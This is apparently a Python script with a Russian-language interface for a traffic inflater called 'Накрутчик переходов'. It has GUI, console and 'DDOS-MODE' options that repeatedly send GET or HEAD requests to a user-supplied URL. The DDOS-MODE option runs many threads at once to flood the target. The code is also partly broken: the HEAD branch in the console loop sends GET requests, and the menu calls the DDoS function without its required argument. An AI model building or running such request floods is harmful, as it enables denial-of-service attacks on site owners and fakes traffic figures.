import requests
import sys
import time
import tkinter as tk
from tkinter import ttk
from threading import Thread
from colorama import init, Fore, Back, Style
import curses

def print_menu(stdscr, options, selected_row):
    h, w = stdscr.getmaxyx()

    # Определение цветовых пар для начального текста
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)    # Зеленый текст на черном фоне для GUI
    curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK)   # Желтый текст на черном фоне для CONSOLE
    curses.init_pair(3, curses.COLOR_MAGENTA, curses.COLOR_BLACK)  # Пурпурный текст на черном фоне для DDOS-MODE
    curses.init_pair(4, curses.COLOR_RED, curses.COLOR_BLACK)      # Красный текст на черном фоне для ВЫХОД

    # Определение цветовых пар для текста при наведении
    curses.init_pair(5, curses.COLOR_BLACK, curses.COLOR_GREEN)    # Белый текст на зеленом фоне для GUI при наведении
    curses.init_pair(6, curses.COLOR_BLACK, curses.COLOR_YELLOW)   # Белый текст на желтом фоне для CONSOLE при наведении
    curses.init_pair(7, curses.COLOR_BLACK, curses.COLOR_MAGENTA)  # Белый текст на пурпурном фоне для DDOS-MODE при наведении
    curses.init_pair(8, curses.COLOR_WHITE, curses.COLOR_RED)      # Белый текст на красном фоне для ВЫХОД

    stdscr.clear()

    for i, option in enumerate(options):
        x = 0
        y = h // 2 - len(options) // 2 + i

        if i == selected_row:
            if i == 0:
                stdscr.attron(curses.color_pair(5) | curses.A_REVERSE)
            elif i == 1:
                stdscr.attron(curses.color_pair(6) | curses.A_REVERSE)
            elif i == 2:
                stdscr.attron(curses.color_pair(7) | curses.A_REVERSE)
            elif i == 3:
                stdscr.attron(curses.color_pair(8))
            stdscr.addstr(y, x, "> " + option)
            stdscr.attroff(curses.color_pair(i+5) | curses.A_REVERSE)
        else:
            stdscr.attron(curses.color_pair(i+1))
            stdscr.addstr(y, x, "  " + option)
            stdscr.attroff(curses.color_pair(i+1))

    stdscr.refresh()

def mode_selection(stdscr):
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)
    options = ["GUI", "CONSOLE", "DDOS-MODE", "ВЫХОД"]
    selected_row = 0

    print_menu(stdscr, options, selected_row)
    stdscr.addstr(0, 0, "Выберите режим:")
    

    key = 0  # Добавьте переменную для отслеживания клавиши

    while key != 10:  # Ждем, пока не будет нажата клавиша Enter
        key = stdscr.getch()

        if key == curses.KEY_UP and selected_row > 0:
            selected_row -= 1
        elif key == curses.KEY_DOWN and selected_row < len(options) - 1:
            selected_row += 1

        print_menu(stdscr, options, selected_row)
        stdscr.addstr(0, 0, "Выберите режим:")

    selected_option = options[selected_row]
    stdscr.refresh()

    if selected_option == "GUI":
        curses.endwin()
        gui.run()
    elif selected_option == "CONSOLE":
        curses.endwin()
        console()
    elif selected_option == "DDOS-MODE":
        curses.endwin()
        ddos_mode()
    elif selected_option == "ВЫХОД":
        sys.exit(1)


stop_flag = False
running = False
font_style = ("Arial Black", 10, "bold")
program_type = None

def send_while(ip: float, request_type, interval):
    while True:
        try:
            if request_type.lower() == 'get':
                try: 
                    requests.get(ip)
                    print(Fore.GREEN, f"Запрос GET отправлен на {ip}")
                except Exception as e: 
                    print(Fore.WHITE, Back.RED, f"Ошибка: {e}")
                    print(Style.RESET_ALL)
                    break
            elif request_type.lower() == 'head':
                try: 
                    requests.get(ip)
                    print(Fore.GREEN, f"Запрос HEAD отправлен на {ip}")
                except Exception as e: 
                    print(Fore.WHITE, Back.RED, f"Ошибка: {e}")
                    print(Style.RESET_ALL)
                    break
            elif request_type.lower() == "exit" or request_type.lower() == "stop":
                sys.exit(0)
            else:
                print("Указан неверный тип запроса")
            time.sleep(interval)
        except Exception as e:
            print(Fore.WHITE, Back.RED, f"Ошибка: {e}")
            print(Style.RESET_ALL)
            break
        except KeyboardInterrupt:
            print(Fore.YELLOW, "=============")
            print(Fore.YELLOW, "    ВЫХОД    ")
            print(Fore.YELLOW, "=============")
            print(Style.RESET_ALL)
            sys.exit(0)

class gui:
    def run():
        def create_aura_label(parent, text, aura_color):
            aura_label = ttk.Label(parent, text=text, font=font_style, background=aura_color)
            aura_label.pack(padx=5, pady=5)
        def toggle_button():
            global running
            running = not running  # Toggle the state (True to False or False to True)

            if running:
                send_button.config(text="Остановить", bg="red", fg="white", command=stop_request)
            else:
                send_button.config(text="Отправить", bg="green", fg="white", command=send_request)
        def stop_request():
            global stop_flag
            stop_flag = True
            toggle_button()

        def send_request():
            global stop_flag
            ip = ip_var.get()
            interval = interval_var.get()
            request_type = request_var.get()  

            if request_type == "GET":
                requests.get(ip) 
            elif request_type == "HEAD":
                requests.head(ip)

            log_text.insert(tk.END, f"Запрос {request_type} отправлен на {ip}\n")
            
            if not stop_flag:
                root.after(interval * 1000, send_request)
            else:
                stop_flag = False

        def validate_fields():
            ip = ip_var.get()
            interval = None
            try:
                interval = float(interval_var.get())
                interval_check = str(interval_var.get())
            except Exception as e:
                log_text.insert(tk.END, f"Ошибка! {e}\nВ поле Интервал надо писать значение\nлибо без дробной части, либо через точку.\nПример: 1.5\n", "error_text")

            if not ',' in interval_check:
                ip_entry.configure(style='TEntry')
                interval_entry.configure(style='TEntry')
                log_text.delete(1.0, tk.END)  # Clear any previous messages
                
                if not ip or not interval:
                    if not ip:
                        ip_entry.configure(style='Error.TEntry')
                    if not interval:
                        interval_entry.configure(style='Error.TEntry')
                    log_text.insert(tk.END, "Заполните все поля!\n", "error_text")
                else:
                    toggle_button()
                    send_request()
            else:
                log_text.insert(tk.END, f"Ошибка! {e}\nВ поле Интервал надо писать значение\nлибо без дробной части, либо через точку.\nПример: 1.5\n")



        root = tk.Tk()
        root.title("Накрутчик переходов")
        root.geometry("575x385")
        root.configure(bg='#212121')
        style = ttk.Style()
        style.configure('TEntry', background='white', foreground='black')
        style.configure('Error.TEntry', background='white', foreground='black', bordercolor='red', borderwidth=2)
        style.configure('Отправить.TButton', font=font_style)
        style.configure('Остановить.TButton', font=font_style)
        
        ip_var = tk.StringVar()
        interval_var = tk.IntVar(value='1')
        request_var = tk.StringVar(value='HEAD')

        ip_label = ttk.Label(root, text="IP адрес или домен:", font=font_style)
        ip_entry = ttk.Entry(root, textvariable=ip_var, font=font_style, background="green", foreground="black", width=40)
        ip_label.configure(foreground="white", background="#52009e")
        #create_aura_label(root, "IP адрес или домен:", "#4e387e")

        interval_label = ttk.Label(root, text="Интервал (сек):", font=font_style)
        interval_entry = ttk.Entry(root, textvariable=interval_var, font=font_style)
        interval_label.configure(foreground="white", background="#52009e")
        interval_entry.configure(foreground="black", font=font_style)
        #create_aura_label(root, "Интервал (сек):", "#4e387e")

        request_label = ttk.Label(root, text="Тип запроса:", font=font_style)
        request_combo = ttk.Combobox(root, textvariable=request_var, values=["GET", "HEAD"], font=font_style, state="readonly")
        request_combo.current(1)
        request_label.configure(foreground="white", background="#52009e")
        request_combo.configure(foreground="black", font=font_style)
        #create_aura_label(root, "Тип запроса:", "#4e387e")

        send_button = tk.Button(root, text="Отправить", font=font_style, bg="green", fg="white")
        send_button.config(command=validate_fields)

        #stop_button = ttk.Button(root, text="Остановить", style="TButton", command=stop_requests)
        #stop_button.grid(row=3, column=1, sticky="w")
        
        log_text = tk.Text(root, height=10, font=font_style)
        log_text.pack(side="bottom")
        log_text.configure(bg="#141414", fg="#00730f")

        ip_label.pack(anchor="nw")
        ip_entry.pack(anchor="ne")

        interval_label.pack(anchor="nw") 
        interval_entry.pack(anchor="ne")

        request_label.pack(anchor="nw")
        request_combo.pack(anchor="ne")  
        
        send_button.pack()

        log_text.tag_configure("error_text", foreground="red")

        root.mainloop()

def console(ip=None, request_type=None, interval=None):
    try:
        while not request_type or request_type.lower() != 'get' and request_type.lower() != 'head' and request_type.lower() != 'stop' and request_type.lower() != 'exit': request_type = input("Тип запроса: GET/HEAD\n> ")
    except KeyboardInterrupt:
        print(Fore.YELLOW, "\n=============")
        print(Fore.YELLOW, "    ВЫХОД    ")
        print(Fore.YELLOW, "=============")
        print(Style.RESET_ALL)
        sys.exit(0)
    try:
        while not ip or not "http" in ip.lower() or not "." in ip.lower(): ip = input("IP адрес или домен для накрутки\n> ")
    except KeyboardInterrupt:
        print(Fore.YELLOW, "\n=============")
        print(Fore.YELLOW, "    ВЫХОД    ")
        print(Fore.YELLOW, "=============")
        print(Style.RESET_ALL)
        sys.exit(0)
    try:
        while interval is None: interval = float(input("Интервал между запросами (в секундах) (например, 1.5)\n> "))
    except KeyboardInterrupt:
        print(Fore.YELLOW, "\n=============")
        print(Fore.YELLOW, "    ВЫХОД    ")
        print(Fore.YELLOW, "=============")
        print(Style.RESET_ALL)
        sys.exit(0)

    send_while(ip, request_type, interval)

def ddos_mode(i):
    ip = None
    request_type = None
    interval = None

    try:
        while not request_type or request_type.lower() != 'get' and request_type.lower() != 'head':
            request_type = input("Тип запроса: GET/HEAD\n> ")
            if request_type == 'exit' or request_type == 'stop':
                sys.exit(0)
    except KeyboardInterrupt:
        print(Fore.YELLOW, "\n=============")
        print(Fore.YELLOW, "    ВЫХОД    ")
        print(Fore.YELLOW, "=============")
        print(Style.RESET_ALL)
        sys.exit(0)
    try:
        while not ip or not "http" in ip.lower() or not "." in ip.lower(): ip = input("IP адрес или домен для накрутки\n> ")
    except KeyboardInterrupt:
        print(Fore.YELLOW, "\n=============")
        print(Fore.YELLOW, "    ВЫХОД    ")
        print(Fore.YELLOW, "=============")
        print(Style.RESET_ALL)
        sys.exit(0)
    try:
        while interval is None: interval = float(input("Интервал между запросами (в секундах) (например, 1.5)\n> "))
    except KeyboardInterrupt:
        print(Fore.YELLOW, "\n=============")
        print(Fore.YELLOW, "    ВЫХОД    ")
        print(Fore.YELLOW, "=============")
        print(Style.RESET_ALL)
        sys.exit(0)
    try:
        for _ in range(i):
            thr = Thread(target=send_while, args=(ip, request_type, interval))
            try:
                thr.start()
                print(Fore.LIGHTMAGENTA_EX, f"Поток {_} запущен!")
                print(Style.RESET_ALL)
            except Exception as e:
                print(Fore.WHITE, Back.RED, f"Не удалось запустить поток {_}! Ошибка: {e}")
                print(Style.RESET_ALL)
    except KeyboardInterrupt:
        print(Fore.YELLOW, "=============")
        print(Fore.YELLOW, "    ВЫХОД    ")
        print(Fore.YELLOW, "=============")
        print(Style.RESET_ALL)
        sys.exit(0)

"""try:
    while not program_type or program_type.lower() != "gui" and program_type.lower() != "console" and program_type.lower() != "ddos-mode": program_type = input("Выберите вид программы: GUI/CONSOLE/DDOS-MODE\n> ")

    if program_type.lower() == "gui":
        gui.run()
    elif program_type.lower() == "console":
        console()
    elif program_type.lower() == "ddos-mode":
        i = None
        while not i: i = int(input("Количество потоков:\n> "))
        ddos_mode(i)
    elif program_type.lower() == "exit" or program_type.lower() == "stop":
        print(Style.RESET_ALL)
        sys.exit(0)"""
try:
    curses.wrapper(mode_selection)
except Exception as e:
    print(Back.RED, Fore.WHITE, f"Ошибка: {e}")
    print(Style.RESET_ALL)
except KeyboardInterrupt:
    print(Fore.YELLOW, "=============")
    print(Fore.YELLOW, "    ВЫХОД    ")
    print(Fore.YELLOW, "=============")
    print(Style.RESET_ALL)
    sys.exit(0)